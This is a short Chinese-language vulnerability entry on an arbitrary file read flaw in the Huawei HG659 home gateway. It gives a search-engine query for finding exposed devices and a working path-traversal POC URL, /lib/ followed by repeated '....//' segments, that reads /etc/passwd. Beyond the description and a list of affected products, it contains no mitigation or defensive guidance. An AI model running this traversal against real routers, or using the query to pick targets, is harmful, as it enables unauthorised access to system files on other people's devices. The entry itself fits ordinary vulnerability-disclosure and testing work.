# Huawei HG659 lib 任意文件读取漏洞

## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

```
Huawei HG659
```

## 网络测绘

```
app="HUAWEI-Home-Gateway-HG659"
```

## 漏洞复现

登录页面如下

![](images/202202110951141.png)

POC如下

```plain
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![](images/202202110951927.png)